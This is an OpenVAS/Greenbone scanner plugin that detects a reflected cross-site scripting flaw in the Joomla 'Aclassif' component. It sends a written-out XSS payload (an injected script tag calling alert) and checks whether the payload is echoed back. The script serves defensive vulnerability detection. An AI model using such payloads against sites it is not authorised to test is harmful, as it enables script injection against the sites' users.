CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803089" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-12-31 13:14:48 +0530 (Mon, 31 Dec 2012)" );
	script_name( "Joomla! 'Aclassif' Component Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/80856" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/119108/Joomla-Aclassif-Cross-Site-Scripting.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Joomla! Aclassif Component" );
	script_tag( name: "insight", value: "The flaw is due to an input passed to 'index.php/component/aclassif' is not
properly sanitised before it is returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with Joomla! Aclassif component and is prone to cross
site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php/component/aclassif/?\"--></style></script><script>alert(3333)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "</script><script>alert\\(3333\\)</script>", extra_check: "option=com_aclassif" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );
